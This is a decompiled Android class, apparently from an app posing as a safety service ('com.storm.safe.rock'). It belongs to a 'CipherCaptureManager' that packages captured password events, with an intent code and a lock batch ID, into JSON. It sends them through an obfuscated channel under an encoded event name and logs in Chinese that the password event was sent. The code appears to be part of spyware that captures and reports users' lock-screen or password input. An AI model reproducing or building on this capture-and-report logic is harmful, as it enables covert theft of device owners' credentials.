package com.storm.safe.rock.service.modules.cipher;

import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.util.StringUtil;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import org.json.JSONObject;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.tz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.cipher.CipherCaptureManager$sendPasswordEvent$1", m214403f = "CipherCaptureManager.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class CipherCaptureManager$sendPasswordEvent$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ C0335a1 f53219a1;

    /* renamed from: a2 */
    public final /* synthetic */ String f53220a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public CipherCaptureManager$sendPasswordEvent$1(C0335a1 c0335a1, String str, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f53219a1 = c0335a1;
        this.f53220a2 = str;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new CipherCaptureManager$sendPasswordEvent$1(this.f53219a1, this.f53220a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) throws Throwable {
        CipherCaptureManager$sendPasswordEvent$1 cipherCaptureManager$sendPasswordEvent$1 = (CipherCaptureManager$sendPasswordEvent$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
        C1351vv c1351vv = C1351vv.f60710b1;
        cipherCaptureManager$sendPasswordEvent$1.invokeSuspend(c1351vv);
        return c1351vv;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            long j = this.f53219a1.f53295a9;
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("intentCode", this.f53220a2);
            if (j > 0) {
                jSONObject.put("lockBatchId", String.valueOf(j));
            }
            dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
            C0323a8 c0323a8M211471g5 = c0290a0 != null ? c0290a0.m211471g5() : null;
            if (c0323a8M211471g5 != null) {
                c0323a8M211471g5.m211658c4(StringUtil.m212470a0("O1gCKVo3HipoND1cHy4="), jSONObject);
            }
            t60.m214714d6("CipherCaptureManager", "📡 密码事件已发送: intentCode=" + this.f53220a2 + ", lockBatchId=" + j);
        } catch (Exception e) {
            tz0.m214807a7("发送密码事件失败: ", e.getMessage(), "CipherCaptureManager");
        }
        return C1351vv.f60710b1;
    }
}
